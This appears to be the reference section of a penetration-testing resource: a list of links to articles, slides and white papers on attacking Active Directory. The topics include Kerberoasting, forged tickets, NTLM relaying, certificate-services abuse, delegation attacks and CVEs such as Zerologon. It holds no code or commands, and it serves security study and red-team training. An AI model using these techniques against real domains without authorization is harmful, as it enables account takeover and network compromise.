* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
* [Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)](https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)
* [Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView](https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/)
* [Pen Testing Active Directory Environments - Part III:  Chasing Power Users](https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/)
* [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
* [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
* [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
* [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
* [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [A Case Study in Wagging the Dog: Computer Takeover - Will Schroeder - Feb 28, 2019](https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783)
* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf](https://adsecurity.org/?p=3592)
* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
* [Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf)
* [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
* [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
* [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
* [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
* [Active-Directory-Exploitation-Cheat-Sheet - @buftas](https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation)
* [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
* [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
* [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
* [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
* [Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
* [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
* [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
* [Certificate templates - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
* [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
* [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
* [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
* [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
* [CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
* [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
* [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
* [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
* [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
* [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
* [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
* [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
* [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
* [S4U2self abuse - TheHackerRecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
* [Abusing Kerberos S4U2self for local privilege escalation - cfalta](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)
* [External Trusts Are Evil - 14 March 2023 - Charlie Clark (@exploitph)](https://exploit.ph/external-trusts-are-evil.html)
* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
